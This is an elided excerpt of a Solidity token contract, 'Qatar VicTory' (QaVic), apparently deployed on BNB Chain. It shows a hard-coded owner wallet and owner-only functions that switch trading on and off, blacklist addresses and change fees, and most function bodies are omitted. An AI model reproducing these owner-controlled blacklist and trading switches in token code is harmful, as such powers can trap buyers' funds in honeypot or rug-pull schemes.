...
// telegram : https://t.me/QatarVictory
...
contract QatarVictory is Context, IERC20 { 
    ...
    address payable private Wallet_Dev = payable(0x5bDCf34f3e55D2511f2BFC68c5596027Cdc79b5e);
    address payable private constant Wallet_Burn = payable(0x000000000000000000000000000000000000dEaD); 


    uint256 private constant MAX = ~uint256(0);
    uint8 private constant _decimals = 18;
    uint256 private _tTotal = 20112022 * (10 ** _decimals);
    string private constant _name = "Qatar VicTory"; 
    string private constant _symbol = unicode"QaVic"; 
    ...
    constructor () {
        ...
        _owner = 0x5bDCf34f3e55D2511f2BFC68c5596027Cdc79b5e;
    ...
    function Start_trading(bool open) external onlyOwner {
        _open = open;
    }
    ...
    function swapTokensForBNB(uint256 tokenAmount) private {
     ...
     function Feesvol(address account) public onlyOwner {
    ...
    */
    ...
    function Blacklist_rv(address[] calldata addresses) external onlyOwner {
    ...
    function Blacklist_R(address addresses) external onlyOwner {
    ...
    function Wlrmv(address addresses) external onlyOwner {
